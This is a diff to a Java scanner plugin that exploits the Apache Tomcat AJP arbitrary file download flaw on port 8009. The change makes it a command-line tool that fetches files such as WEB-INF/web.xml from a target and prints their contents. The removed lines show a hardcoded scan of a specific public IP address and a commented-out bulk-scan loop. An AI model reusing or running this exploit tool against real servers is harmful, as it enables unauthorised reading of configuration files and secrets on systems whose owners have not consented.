@@ -3,7 +3,10 @@ package com.gbw.scanner.plugins.scripts.web.tomcat;
 import com.gbw.scanner.Host;
 import com.gbw.scanner.plugins.scripts.GBWScanScript;
 import com.gbw.scanner.plugins.scripts.GBWScanScriptCommonConfig;
+import com.gbw.scanner.plugins.scripts.GBWScanScriptTool;
 import com.gbw.scanner.sink.SinkQueue;
+import org.apache.commons.cli.CommandLine;
+import org.apache.commons.cli.Options;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
@@ -61,13 +64,18 @@ public class GBWScanAJPScript implements GBWScanScript {
             if(responses!=null&&responses.size()>0){
 
                 log.warn(String.format("Find a apache tomcat ajp any file download poc in:%s:%d",host.getServer(),host.getPort()));
-                //System.out.println(String.format("Find a apache tomcat ajp any file download poc in:%s:%d",host.getServer(),host.getPort()));
-                sinkQueue.put(new GBWScanAJPResult(config,host,responses));
+                System.out.println(String.format("Find a apache tomcat ajp any file download poc in:%s:%d",host.getServer(),host.getPort()));
 
+                if(sinkQueue!=null) {
+                    sinkQueue.put(new GBWScanAJPResult(config, host, responses));
+                }else{
+
+                    System.out.println(getText(responses));
+                }
                 //System.out.println(new String(data));
             }
         }catch (Exception e){
-            e.printStackTrace();
+            System.out.println(String.format("scan tomcat any file download ip:%s:%d,error:%s",host.getIp(),host.getPort(),e.getMessage()));
         }finally {
 
             if(client!=null)
@@ -75,36 +83,57 @@ public class GBWScanAJPScript implements GBWScanScript {
         }
     }
 
+    private  String getText(List<GBWAJPResponse> responses){
 
+        StringBuffer sb = new StringBuffer();
+        responses.forEach(res->{
+            sb.append(res.getData());
+        });
 
-    public static void main(String[] args)  {
+        return sb.toString();
+    }
 
+    public static void main(String[] args)  throws Exception {
+
+        Options opts = new Options();
         GBWScanAJPConfig config = new GBWScanAJPConfig();
-        config.setFile("WEB-INF/web.xml");
-        config.setFilePrefix("web.xml");
-        config.setStoreDir("D:\\shajf_dev\\GBWScanner\\target");
-        config.setSSL(false);
-        config.setConTimeout(10000);
-        config.setReadTimeout(10000);
-        config.setUri("/");
-        config.setMaxLen(8192);
+
+        String uri = "/";
+        String file = "WEB-INF/web.xml";
+        boolean isSSL = false;
+        int maxLen = 8192;
+
+        opts.addOption("uri",true,"tomcat root uri");
+        opts.addOption("file",true,"will download file");
+        opts.addOption("ssl",false,"use ssl or not");
+        opts.addOption("maxLen",true,"size limits of download file");
+
         GBWScanAJPScript scanAJPScript = new GBWScanAJPScript(config);
 
-/*
-        for (String line:Files.readAllLines(Paths.get("D:\\shajf_dev\\GBWScanner\\target\\8009.data"))){
+        GBWScanScriptTool tool = new GBWScanScriptTool(args,scanAJPScript,opts,8009);
 
-            String[] ips = line.split(":");
+        CommandLine cli = tool.getCliParser();
 
-            Host host = new Host(ips[0],ips[0],Integer.parseInt(ips[1]),null,"tcp");
+        if(cli.hasOption("uri")){
+            uri = cli.getOptionValue("uri");
+        }
+        if(cli.hasOption("file")){
+            file = cli.getOptionValue("file");
+        }
+        if(cli.hasOption("ssl")){
+            isSSL = true;
+        }
 
-            System.out.println("start:"+host.getHost());
+        if(cli.hasOption("maxLen")){
+            maxLen = Integer.parseInt(cli.getOptionValue("maxLen"));
+        }
 
-            scanAJPScript.scan(host,null);
-        }*/
+        config.setUri(uri);
+        config.setFile(file);
+        config.setSSL(isSSL);
+        config.setMaxLen(maxLen);
 
-
-        Host host = new Host("69.89.15.79","69.89.15.79",8009,null,"tcp");
-        scanAJPScript.scan(host,null);
+        tool.start();
     }
 
 }
